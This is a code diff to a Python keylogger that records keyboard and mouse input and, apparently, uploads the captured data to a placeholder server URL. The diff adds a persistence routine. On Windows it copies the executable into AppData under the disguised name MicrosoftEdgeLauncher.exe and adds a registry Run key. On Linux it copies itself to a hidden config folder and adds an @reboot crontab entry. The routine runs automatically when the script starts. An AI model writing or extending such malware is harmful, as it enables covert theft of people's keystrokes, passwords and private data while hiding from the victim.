@@ -1,6 +1,5 @@
 from pynput import keyboard, mouse  # Import the mouse listener
-import os
-import platform
+import os, shutil, subprocess, platform, sys
 import time
 import requests
 import getpass
@@ -8,7 +7,30 @@ import atexit
 from datetime import datetime
 from threading import Thread
 import signal
-import sys
+from sys import executable
+
+def setup_persistence():        #This function sets up persistence (runs automatically at startup) of this executable.
+
+    os_type = platform.system()
+    if os_type == "Windows":
+        location = os.environ['appdata'] + "\\MicrosoftEdgeLauncher.exe" # Disguise the keylogger as Microsoft Edge
+        if not os.path.exists(location):
+            shutil.copyfile(executable, location)
+            subprocess.call(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MicrosoftEdge /t REG_SZ /d "{location}" ', shell=True)
+    elif os_type == "Linux":
+        location = os.path.expanduser('~') + "/.config/KaliStartup"
+        if not os.path.exists(location):
+            # Create the autostart directory if it doesn't exist
+            os.makedirs(location)
+            filename = os.path.join(location, "KaliStartup")
+            # Copy the keylogger to that new location
+            shutil.copyfile(sys.executable, filename)
+            # Add the keylogger to startup via crontab
+            crontab_line = f"@reboot {filename}"
+            os.system(f'(crontab -l; echo "{crontab_line}") | crontab -')
+
+# Run the setup_persistence function
+setup_persistence()
 
 # Define the server URL for file uploads
 SERVER_URL = 'https://yourserver.com/upload'  # Replace with your server URL
